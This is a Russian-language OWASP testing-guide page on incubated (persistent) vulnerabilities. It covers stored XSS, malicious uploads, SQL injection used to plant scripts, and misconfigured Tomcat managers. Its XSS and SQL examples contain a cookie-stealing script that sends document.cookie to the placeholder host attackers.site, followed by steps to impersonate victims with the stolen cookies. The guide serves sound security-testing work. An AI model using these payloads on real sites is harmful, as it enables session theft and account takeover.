---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование инкубационных уязвимостей

|ID          |
|------------|
|WSTG-INPV-14|

## Обзор

Инкубационное тестирование, также часто называемое постоянными атаками, представляет собой сложный метод тестирования, для работы которого требуется более одной уязвимости контроля данных. Инкубационные уязвимости обычно используются для проведения атак типа «водопой» (англ.: watering hole) против законных пользователей web-приложений.

Инкубационные уязвимости имеют следующие характеристики:

- Во-первых, должен быть сохранён вектор атаки, он должен храниться на уровне хранения данных, а это может произойти только в том случае, если отсутствует строгий контроль данных или данные поступают в систему через другой канал, например, консоль администратора, или напрямую. через серверный пакетный процесс.
- Во-вторых, после того, как вектор атаки будет «отзываться», его нужно будет успешно выполнить. В частности, инкубационная XSS-атака требует слабого контроля выходных данных, потому что скрипт будет доставляться клиенту в исполняемой форме.

Эксплуатация некоторых уязвимостей или даже функциональных особенностей web-приложения позволит злоумышленнику «подложить» данные, которые впоследствии будут извлечены ничего не подозревающим пользователем или другим компонентом системы, эксплуатирующим там какую-то уязвимость.

В тесте на проникновение `инкубационные атаки` могут использоваться для оценки критичности определённых ошибок, используя конкретную обнаруженную проблему безопасности для создания атаки на стороне клиента, которая обычно используется для одновременного воздействия на большое количество жертв. (т.е. на всех посетителей, просматривающих сайт).

Этот тип асинхронной атаки охватывает широкий спектр векторов атаки, среди которых следующие:

- Компоненты загрузки файлов в web-приложении, позволяющие злоумышленнику загружать поврежденные медиафайлы (изображения JPEG, эксплуатирующие `CVE-2004-0200`, изображения PNG с `CVE-2004-0597`, исполняемые файлы, страницы сайта с активным компонентом и т.д.)
- Проблемы с межсайтовыми скриптами (XSS) в сообщениях на публичных форумах (см. [Тестирование хранимых межсайтовых скриптов](02-Testing_for_Stored_Cross_Site_Scripting.md). Злоумышленник потенциально может хранить вредоносные скрипты или код в репозитории серверной части web-приложения (например, в базе данных), чтобы этот скрипт/код выполнялся одним из посетителей (конечным пользователем, администратором и т.д.) Примером типичной инкубационной атаки является эксплуатация уязвимости межсайтового скриптинга на форуме пользователей, доске объявлений или в блоге посредством инъекции некоторого JavaScript-кода на уязвимой странице, которая в конечном итоге будет отображаться и выполняться в браузере пользователя с уровнем доверия к исходному (уязвимому) сайту.
- SQL/XPATH-инъекции, позволяющее злоумышленнику загружать контент в базу данных, который впоследствии будет извлечён наряду с другим активным контентом web-страницы. Например, если злоумышленник может опубликовать произвольный JavaScript-код на доске объявлений, чтобы его выполняли посетители, он может получить контроль над их браузерами (например, посредством [XSS-proxy](https://xss-proxy.sourceforge.net/)).
- Некорректно настроенные серверы, позволяющие устанавливать пакеты Java или аналогичные компоненты web-сайта (например, Tomcat или консоли web-хостинга, такие как Plesk, CPanel, Helm и т.д.)

## Задачи тестирования

- Выявить хранимые инъекции, которым требуется этап отзыва.
- Понять, в чём заключается этот этап отзыва.
- Установить прослушиватели (англ. listeners) или активировать этап отзыва, если это возможно.

## Как тестировать

### Тестирование методом чёрного ящика

#### Пример с загрузкой файла

Посмотрите какой тип контента разрешён для загрузки в web-приложение, и результирующий URL для загруженного файла. Загрузите файл, который будет эксплуатировать компонент на локальной рабочей станции пользователя при просмотре или загрузке. Отправьте своей жертве электронное письмо или другой вид уведомления, чтобы побудить его/её просмотреть страницу. Ожидаемый результат — эксплойт сработает, когда пользователь будет просматривать результирующую страницу или загрузит и запустит файл с доверенного сайта.

#### Пример с XSS на доске объявлений

1. Введите код JavaScript в качестве значения для уязвимого поля, например `<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
2. Направьте пользователей на просмотр уязвимой страницы или дождитесь, пока пользователи ее просмотрят. Установите «прослушиватель» на хосте `attackers.site`, прослушивающий все входящие подключения.
3. Когда пользователи просматривают уязвимую страницу, запрос, содержащий их cookie  (`document.cookie` включается в состав запрашиваемого URL), и отправляется на хост `attackers.site`, например: `GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1`
4. Используйте эти cookie, чтобы выдавать себя за пользователей на уязвимом сайте.

#### Пример SQL-инъекции

Обычно в этом наборе примеров используются XSS-атаки посредством эксплуатации SQL-инъекций. Первое, что нужно проверить, — есть ли на целевом сайте уязвимость SQL-инъекций. Это описано в [Тестировании SQL-инъекций](05-Testing_for_SQL_Injection.md). Для каждой уязвимости SQL-инъекции существует базовый набор ограничений, описывающих тип запросов, которые разрешено выполнять злоумышленнику/пентестеру.

Затем тестировщик должен сопоставить разработанные им XSS-атаки с записями, которые ему разрешено вставлять.

Аналогичным образом, как и в предыдущем примере XSS, используйте поле web-страницы, уязвимое для SQL-инъекций, чтобы изменить значение в базе данных, которое будет использоваться приложением в качестве входных данных для отображения на сайте без надлежащей фильтрации (сочетание SQL-инъекции и XSS). Например, предположим, что в базе данных есть таблица `footer` со всеми нижними колонтитулами для страниц web-сайта, включая поле `notice` с юридическим уведомлением, которое появляется внизу каждой web-страницы. Вы можете использовать следующий запрос, чтобы вставить код JavaScript в поле `notice` таблицы `footer`.

```sql
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write(\'<img src="http://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
   WHERE notice = 'Copyright 1999-2030';
```

Теперь каждый посетитель, просматривающий сайт, не замечая того, отправляет свои cookie на `attackers.site`.

#### Неправильно настроенный сервер

Некоторые web-серверы предоставляют интерфейс администрирования, который может позволить злоумышленнику загружать на сайт активные компоненты по своему желанию. Это может иметь место с сервером Apache Tomcat, который не применяет строгую аутентификацию при доступе к Web Application Manager (или если пентестер смог получить действующую учётную запись для модуля администрирования другими способами).

В этом случае можно загрузить WAR-файл и развернуть новое web-приложение на сайте, что позволит пентестеру не только выполнить свой код локально на сервере, но и разместить приложение на доверенном сайте, к которому затем смогут получить доступ обычные посетители (скорее, даже с более высокой степенью доверия, чем при доступе к другому сайту).

Также должно быть очевидно, что возможность изменять содержимое web-страницы на сервере с помощью уязвимостей, которые могут эксплуатироваться на хосте, даёт злоумышленнику права на запись в webroot, что также будет полезно для запуска инкубационной атаки на странице web-сервера (на самом деле, это известный способ для распространения некоторых червей на web-серверах).

### Тестирование методом серого ящика

Методы тестирования «серым» или «белым ящиком» будут такими же, как обсуждалось ранее.

- Тестирование контроля входных данных является ключом к снижению воздействия от этой уязвимости. Если другие системы на предприятии используют тот же уровень хранения данных, они могут иметь слабый контроль ввода, поэтому данные могут сохраняться через «чёрный ход» (англ.: backdoor).
- Чтобы бороться с проблемой «чёрного хода» (англ.: backdoor) для атак на стороне клиента, необходимо также использовать контроль выходных данных, поэтому модифицированные данные должны быть закодированы до отображения клиенту и, следовательно, не выполняться.

## Инструменты

- [XSS-proxy](https://sourceforge.net/projects/xss-proxy)
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Metasploit](https://www.metasploit.com/)

## Ссылки

Большинство ссылок из раздела [Межсайтовый скриптинг](02-Testing_for_Stored_Cross_Site_Scripting.md). Как пояснялось выше, инкубационные атаки проводятся при сочетании уязвимостей, таких как XSS-атаки или [SQL-инъекции](05-Testing_for_SQL_Injection.md).

### Рекомендации

- [CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Blackboard Academic Suite 6.2.23 +/-: Persistent cross-site scripting vulnerability](https://cxsecurity.com/issue/WLB-2006080004)

### Технические руководства

- [Web Application Security Consortium "Threat Classification, Cross-site scripting"](http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml)
